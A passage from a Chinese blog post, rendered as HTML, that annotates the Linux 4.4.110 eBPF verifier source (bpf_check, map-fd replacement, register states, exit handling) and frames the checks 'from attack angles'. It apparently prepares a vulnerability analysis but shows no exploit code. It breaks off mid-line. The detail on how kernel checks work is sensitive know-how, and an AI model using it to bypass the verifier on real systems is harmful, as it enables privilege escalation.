bpf_prog_uncharge_memlock(prog);<br>free_prog_nouncharge:<br>	bpf_prog_free(prog);<br>	<span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure>
<h4 id="bpf-check"><a href="#bpf-check" class="headerlink" title="bpf_check"></a>bpf_check</h4>下面进入加载的检查逻辑——<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L2214">bpf_check</a>，功能流程如下。<br>[1]处将特定指令中的mapfd换成相应的map实际地址，这里需要注意，map实际地址是一个内核地址，有8字节，这样就需要有两条指令的长度来存这个地址，具体可以看下面对这个函数的分析。<br>[2]中借用了程序控制流图的思路来检查这个eBPF程序中是否有死循环和跳转到未初始化的位置，造成无法预期的风险。<br>[3]是实际模拟执行的检测当上述有任一出现问题的检测，是检测的重点。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bpf_check</span><span class="hljs-params">(struct bpf_prog **prog, <span class="hljs-keyword">union</span> bpf_attr *attr)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">char</span> __user *log_ubuf = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_env</span> *<span class="hljs-title">env</span>;</span><br>	<span class="hljs-keyword">int</span> ret = -EINVAL;<br><br>	<span class="hljs-comment">// 指令条数判断</span><br>	<span class="hljs-keyword">if</span> ((*prog)-&gt;len &lt;= <span class="hljs-number">0</span> || (*prog)-&gt;len &gt; BPF_MAXINSNS)<br>		<span class="hljs-keyword">return</span> -E2BIG;<br><br>	<span class="hljs-comment">/* &#x27;struct verifier_env&#x27; can be global, but since it&#x27;s not small,</span><br><span class="hljs-comment">	 * allocate/free it every time bpf_check() is called</span><br><span class="hljs-comment">	 */</span><br>	env = kzalloc(<span class="hljs-keyword">sizeof</span>(struct verifier_env), GFP_KERNEL);<br>	<span class="hljs-keyword">if</span> (!env)<br>		<span class="hljs-keyword">return</span> -ENOMEM;<br><br>	env-&gt;prog = *prog;<br><br>	<span class="hljs-comment">/* grab the mutex to protect few globals used by verifier */</span><br>	mutex_lock(&amp;bpf_verifier_lock);<br><br>	<span class="hljs-keyword">if</span> (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;<br>		<span class="hljs-comment">/* user requested verbose verifier output</span><br><span class="hljs-comment">		 * and supplied buffer to store the verification trace</span><br><span class="hljs-comment">		 */</span><br>		log_level = attr-&gt;log_level;<br>		log_ubuf = (<span class="hljs-keyword">char</span> __user *) (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) attr-&gt;log_buf;<br>		log_size = attr-&gt;log_size;<br>		log_len = <span class="hljs-number">0</span>;<br><br>		ret = -EINVAL;<br>		<span class="hljs-comment">/* log_* values have to be sane */</span><br>		<span class="hljs-keyword">if</span> (log_size &lt; <span class="hljs-number">128</span> || log_size &gt; UINT_MAX &gt;&gt; <span class="hljs-number">8</span> ||<br>		    log_level == <span class="hljs-number">0</span> || log_ubuf == <span class="hljs-literal">NULL</span>)<br>			<span class="hljs-keyword">goto</span> free_env;<br><br>		ret = -ENOMEM;<br>		log_buf = vmalloc(log_size);<br>		<span class="hljs-keyword">if</span> (!log_buf)<br>			<span class="hljs-keyword">goto</span> free_env;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		log_level = <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-comment">// 将伪指令中操作map_fd的部分替换成map地址，注意这个地址是8字节的，因此在实现中用本指令的imm和下一条指令的2个4字节中存储了这个地址</span><br>[<span class="hljs-number">1</span>]	ret = replace_map_fd_with_map_ptr(env);<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> skip_full_check;<br><br>	env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,<br>				       <span class="hljs-keyword">sizeof</span>(struct verifier_state_list *),<br>				       GFP_USER);<br>	ret = -ENOMEM;<br>	<span class="hljs-keyword">if</span> (!env-&gt;explored_states)<br>		<span class="hljs-keyword">goto</span> skip_full_check;<br><br>[<span class="hljs-number">2</span>]	ret = check_cfg(env);<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> skip_full_check;<br><br>	env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);<br><br>[<span class="hljs-number">3</span>]	ret = do_check(env);<br><br>skip_full_check:<br>	<span class="hljs-keyword">while</span> (pop_stack(env, <span class="hljs-literal">NULL</span>) &gt;= <span class="hljs-number">0</span>);<br>	free_states(env);<br><br>	<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>		<span class="hljs-comment">/* program is valid, convert *(u32*)(ctx + off) accesses */</span><br>		ret = convert_ctx_accesses(env);<br><br>	<span class="hljs-keyword">if</span> (log_level &amp;&amp; log_len &gt;= log_size - <span class="hljs-number">1</span>) &#123;<br>		BUG_ON(log_len &gt;= log_size);<br>		<span class="hljs-comment">/* verifier log exceeded user supplied buffer */</span><br>		ret = -ENOSPC;<br>		<span class="hljs-comment">/* fall through to return what was recorded */</span><br>	&#125;<br><br>	<span class="hljs-comment">/* copy verifier log back to user space including trailing zero */</span><br>	<span class="hljs-keyword">if</span> (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>) &#123;<br>		ret = -EFAULT;<br>		<span class="hljs-keyword">goto</span> free_log_buf;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span> &amp;&amp; env-&gt;used_map_cnt) &#123;<br>		<span class="hljs-comment">/* if program passed verifier, update used_maps in bpf_prog_info */</span><br>		env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,<br>							  <span class="hljs-keyword">sizeof</span>(env-&gt;used_maps[<span class="hljs-number">0</span>]),<br>							  GFP_KERNEL);<br><br>		<span class="hljs-keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;<br>			ret = -ENOMEM;<br>			<span class="hljs-keyword">goto</span> free_log_buf;<br>		&#125;<br><br>		<span class="hljs-built_in">memcpy</span>(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,<br>		       <span class="hljs-keyword">sizeof</span>(env-&gt;used_maps[<span class="hljs-number">0</span>]) * env-&gt;used_map_cnt);<br>		env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;<br><br>		<span class="hljs-comment">/* program is valid. Convert pseudo bpf_ld_imm64 into generic</span><br><span class="hljs-comment">		 * bpf_ld_imm64 instructions</span><br><span class="hljs-comment">		 */</span><br>		convert_pseudo_ld_imm64(env);<br>	&#125;<br><br>free_log_buf:<br>	<span class="hljs-keyword">if</span> (log_level)<br>		vfree(log_buf);<br>free_env:<br>	<span class="hljs-keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps)<br>		<span class="hljs-comment">/* if we didn&#x27;t copy map pointers into bpf_prog_info, release</span><br><span class="hljs-comment">		 * them now. Otherwise free_bpf_prog_info() will release them.</span><br><span class="hljs-comment">		 */</span><br>		release_maps(env);<br>	*prog = env-&gt;prog;<br>	kfree(env);<br>	mutex_unlock(&amp;bpf_verifier_lock);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>
<h4 id="replace-map-fd-with-map-ptr"><a href="#replace-map-fd-with-map-ptr" class="headerlink" title="replace_map_fd_with_map_ptr"></a>replace_map_fd_with_map_ptr</h4><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L1990">replace_map_fd_with_map_ptr</a>函数中，可以看到当满足[1]、[2]两个条件时，即opcode = BPF_LD | BPF_IMM | BPF_DW=0x18，且src_reg = BPF_PSEUDO_MAP_FD = 1时，将根据imm的值进行map查找，并将得到的地址分成两部分，分别存储于该条指令和下一条指令的imm部分，与上文所说的占用两条指令是相符的。满足上述两个条件的语句又被命名为BPF_LD_MAP_FD，即把map地址放到寄存器里，该指令写完后，下一条指令应为无意义的填充。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">replace_map_fd_with_map_ptr</span><span class="hljs-params">(struct verifier_env *env)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">insn</span> =</span> env-&gt;prog-&gt;insnsi;<br>	<span class="hljs-keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;<br>	<span class="hljs-keyword">int</span> i, j;<br><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++, insn++) &#123;<br>		<span class="hljs-keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_LDX &amp;&amp;<br>		    (BPF_MODE(insn-&gt;code) != BPF_MEM || insn-&gt;imm != <span class="hljs-number">0</span>)) &#123;<br>			verbose(<span class="hljs-string">&quot;BPF_LDX uses reserved fields\n&quot;</span>);<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		&#125;<span class="hljs-comment">// 不允许向寄存器直接写值 LDX</span><br><br>		<span class="hljs-keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_STX &amp;&amp;<br>		    ((BPF_MODE(insn-&gt;code) != BPF_MEM &amp;&amp;<br>		      BPF_MODE(insn-&gt;code) != BPF_XADD) || insn-&gt;imm != <span class="hljs-number">0</span>)) &#123;<br>			verbose(<span class="hljs-string">&quot;BPF_STX uses reserved fields\n&quot;</span>);<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		&#125;<span class="hljs-comment">// 不允许向地址写寄存器 STX</span><br><br>[<span class="hljs-number">1</span>]		<span class="hljs-keyword">if</span> (insn[<span class="hljs-number">0</span>].code == (BPF_LD | BPF_IMM | BPF_DW)) &#123;<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map</span>;</span><br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><br>			<span class="hljs-keyword">if</span> (i == insn_cnt - <span class="hljs-number">1</span> || insn[<span class="hljs-number">1</span>].code != <span class="hljs-number">0</span> ||<br>			    insn[<span class="hljs-number">1</span>].dst_reg != <span class="hljs-number">0</span> || insn[<span class="hljs-number">1</span>].src_reg != <span class="hljs-number">0</span> ||<br>			    insn[<span class="hljs-number">1</span>].off != <span class="hljs-number">0</span>) &#123;<br>				verbose(<span class="hljs-string">&quot;invalid bpf_ld_imm64 insn\n&quot;</span>);<br>				<span class="hljs-keyword">return</span> -EINVAL;<br>			&#125;<span class="hljs-comment">// 最后一条指令，下一条指令确定为0</span><br><br>			<span class="hljs-keyword">if</span> (insn-&gt;src_reg == <span class="hljs-number">0</span>)<br>				<span class="hljs-comment">/* valid generic load 64-bit imm */</span><br>				<span class="hljs-keyword">goto</span> next_insn;<br><br>[<span class="hljs-number">2</span>]			<span class="hljs-keyword">if</span> (insn-&gt;src_reg != BPF_PSEUDO_MAP_FD) &#123;<br>				verbose(<span class="hljs-string">&quot;unrecognized bpf_ld_imm64 insn\n&quot;</span>);<br>				<span class="hljs-keyword">return</span> -EINVAL;<br>			&#125;<br><br>			f = fdget(insn-&gt;imm);<br>			<span class="hljs-built_in">map</span> = __bpf_map_get(f);<br>			<span class="hljs-keyword">if</span> (IS_ERR(<span class="hljs-built_in">map</span>)) &#123;<br>				verbose(<span class="hljs-string">&quot;fd %d is not pointing to valid bpf_map\n&quot;</span>,<br>					insn-&gt;imm);<br>				<span class="hljs-keyword">return</span> PTR_ERR(<span class="hljs-built_in">map</span>);<br>			&#125;<br><br>			<span class="hljs-comment">/* store map pointer inside BPF_LD_IMM64 instruction */</span><br>			insn[<span class="hljs-number">0</span>].imm = (u32) (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) <span class="hljs-built_in">map</span>;<br>			insn[<span class="hljs-number">1</span>].imm = ((u64) (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) <span class="hljs-built_in">map</span>) &gt;&gt; <span class="hljs-number">32</span>;<br><br>			<span class="hljs-comment">/* check whether we recorded this map already */</span><br>			<span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; env-&gt;used_map_cnt; j++)<br>				<span class="hljs-keyword">if</span> (env-&gt;used_maps[j] == <span class="hljs-built_in">map</span>) &#123;<br>					fdput(f);<br>					<span class="hljs-keyword">goto</span> next_insn;<br>				&#125;<br><br>			<span class="hljs-keyword">if</span> (env-&gt;used_map_cnt &gt;= MAX_USED_MAPS) &#123;<br>				fdput(f);<br>				<span class="hljs-keyword">return</span> -E2BIG;<br>			&#125;<br><br>			<span class="hljs-comment">/* hold the map. If the program is rejected by verifier,</span><br><span class="hljs-comment">			 * the map will be released by release_maps() or it</span><br><span class="hljs-comment">			 * will be used by the valid program until it&#x27;s unloaded</span><br><span class="hljs-comment">			 * and all maps are released in free_bpf_prog_info()</span><br><span class="hljs-comment">			 */</span><br>			<span class="hljs-built_in">map</span> = bpf_map_inc(<span class="hljs-built_in">map</span>, <span class="hljs-literal">false</span>);<br>			<span class="hljs-keyword">if</span> (IS_ERR(<span class="hljs-built_in">map</span>)) &#123;<br>				fdput(f);<br>				<span class="hljs-keyword">return</span> PTR_ERR(<span class="hljs-built_in">map</span>);<br>			&#125;<br>			env-&gt;used_maps[env-&gt;used_map_cnt++] = <span class="hljs-built_in">map</span>;<br><br>			fdput(f);<br>next_insn:<br>			insn++;<br>			i++;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-comment">/* now all pseudo BPF_LD_IMM64 instructions load valid</span><br><span class="hljs-comment">	 * &#x27;struct bpf_map *&#x27; into a register instead of user map_fd.</span><br><span class="hljs-comment">	 * These pointers will be used later by verifier to validate map access.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h4 id="do-check"><a href="#do-check" class="headerlink" title="do_check"></a>do_check</h4>下面进行check过程中最核心的<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L1723">do_check</a>函数，首先可以看到整个程序处于一个for死循环中，其中维护了一系列寄存器，其寄存器变量定义和初始化如下，可以看到寄存器的值是一个int类型，并且有一个枚举的type变量，type类型包括未定义、位置、立即数、指针等，初始化时会将全部寄存器类型定义为未定义，赋值为0。第十个寄存器定义为栈指针，第一个定义为内容指针。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reg_state</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> <span class="hljs-title">type</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span><br>        <span class="hljs-keyword">int</span> imm;<br><br>        <span class="hljs-comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span><br><span class="hljs-comment">         *   PTR_TO_MAP_VALUE_OR_NULL</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map_ptr</span>;</span><br>    &#125;;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init_reg_state</span><span class="hljs-params">(struct reg_state *regs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_BPF_REG; i++) &#123;<br>        regs[i].type = NOT_INIT;<br>        regs[i].imm = <span class="hljs-number">0</span>;<br>        regs[i].map_ptr = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* frame pointer */</span><br>    regs[BPF_REG_FP].type = FRAME_PTR;<br><br>    <span class="hljs-comment">/* 1st arg to a function */</span><br>    regs[BPF_REG_1].type = PTR_TO_CTX;<br>&#125;<br><span class="hljs-comment">/* types of values stored in eBPF registers */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> &#123;</span><br>    NOT_INIT = <span class="hljs-number">0</span>,        <span class="hljs-comment">/* nothing was written into register */</span><br>    UNKNOWN_VALUE,       <span class="hljs-comment">/* reg doesn&#x27;t contain a valid pointer */</span><br>    PTR_TO_CTX,      <span class="hljs-comment">/* reg points to bpf_context */</span><br>    CONST_PTR_TO_MAP,    <span class="hljs-comment">/* reg points to struct bpf_map */</span><br>    PTR_TO_MAP_VALUE,    <span class="hljs-comment">/* reg points to map element value */</span><br>    PTR_TO_MAP_VALUE_OR_NULL,<span class="hljs-comment">/* points to map elem value or NULL */</span><br>    FRAME_PTR,       <span class="hljs-comment">/* reg == frame_pointer */</span><br>    PTR_TO_STACK,        <span class="hljs-comment">/* reg == frame_pointer + imm */</span><br>    CONST_IMM,       <span class="hljs-comment">/* constant integer value */</span><br>&#125;;<br></code></pre></td></tr></table></figure>
check函数的处理方式是逐条处理，按照不同的类型分别做check。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">do_check</span><span class="hljs-params">(struct verifier_env *env)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>    init_reg_state(regs);<br>    insn_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">insn</span>;</span><br>        u8 <span class="hljs-class"><span class="hljs-keyword">class</span>;</span><br>        <span class="hljs-keyword">int</span> err;<br>    <br>        <span class="hljs-keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;<br>            verbose(<span class="hljs-string">&quot;invalid insn idx %d insn_cnt %d\n&quot;</span>,<br>                insn_idx, insn_cnt);<br>            <span class="hljs-keyword">return</span> -EFAULT;<br>        &#125;<br>    <br>           <span class="hljs-comment">//每次取一条指令</span><br>        insn = &amp;insns[insn_idx]; <br>        <span class="hljs-comment">//获取指令的操作码</span><br>        <span class="hljs-class"><span class="hljs-keyword">class</span> =</span> BPF_CLASS(insn-&gt;code);<br>        ...<br></code></pre></td></tr></table></figure>
由于指令比较多，不一样赘述了，下面从两个攻击角度去展示程序是如何检测的。<h5 id="for循环检查结束并退出"><a href="#for循环检查结束并退出" class="headerlink" title="for循环检查结束并退出"></a>for循环检查结束并退出</h5>退出指令定义为BPF_EXIT，这个指令属于BPF_JMP大类，可以看到当指令为该条指令的时候会执行一个pop_stack操作，而当这个函数的返回值是负数的时候，用break跳出死循环。否则会用这个作为取值的位置去执行下一条指令。对于这个操作的理解是，当遇到条件跳转的时候，程序会默认执行一个分支，然后将另外一个分支压入stack中，当一个分支执行结束后，去检查另外一个分支，类似于迷宫问题解决里走到思路的退栈操作。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (class == BPF_JMP) &#123;<br>			u8 opcode = BPF_OP(insn-&gt;code);<br><br>			<span class="hljs-keyword">if</span> (opcode == BPF_CALL) &#123;<br>				<span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||<br>				    insn-&gt;off != <span class="hljs-number">0</span> ||<br>				    insn-&gt;src_reg != BPF_REG_0 ||<br>				    insn-&gt;dst_reg != BPF_REG_0) &#123;<br>					verbose(<span class="hljs-string">&quot;BPF_CALL uses reserved fields\n&quot;</span>);<br>					<span class="hljs-keyword">return</span> -EINVAL;<br>				&#125;<br><br>				err = check_call(env, insn-&gt;imm);<br>				<span class="hljs-keyword">if</span> (err)<br>					<span class="hljs-keyword">return</span> err;<br><br>			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opcode == BPF_JA) &#123;<br>				<span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||<br>				    insn-&gt;imm != <span class="hljs-number">0</span> ||<br>				    insn-&gt;src_reg != BPF_REG_0 ||<br>				    insn-&gt;dst_reg != BPF_REG_0) &#123;<br>					verbose(<span class="hljs-string">&quot;BPF_JA uses reserved fields\n&quot;</span>);<br>					<span class="hljs-keyword">return</span> -EINVAL;<br>				&#125;<br><br>				insn_idx += insn-&gt;off + <span class="hljs-number">1</span>;<br>				<span class="hljs-keyword">continue</span>;<br><br>			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opcode == BPF_EXIT) &#123;<br>				<span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||<br>				    insn-&gt;imm != <span class="hljs-number">0</span> ||<br>				    insn-&gt;src_reg != BPF_REG_0 ||<br>				    insn-&gt;dst_reg != BPF_REG_0) &#123;<br>					verbose(<span class="hljs-string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);<br>					<span class="hljs-keyword">return</span> -EINVAL;<br>				&#125;<br><br>				<span class="hljs-comment">/* eBPF calling convetion is such that R0 is used</span><br><span class="hljs-comment">				 * to return the value from eBPF program.</span><br><span class="hljs-comment">				 * Make sure that it&#x27;s readable at this time</span><br><span class="hljs-comment">				 * of bpf_exit, which means that program wrote</span><br><span class="hljs-comment">				 * something into it earlier</span><br><span class="hljs-comment">				 */</span><br>				err = check_reg_arg(regs, BPF_REG_0, SRC_OP);<br>				<span class="hljs-keyword">if</span> (err)<br>					<span class="hljs-keyword">return</span> err;<br><br>				<span class="hljs-keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;<br>					verbose(<span 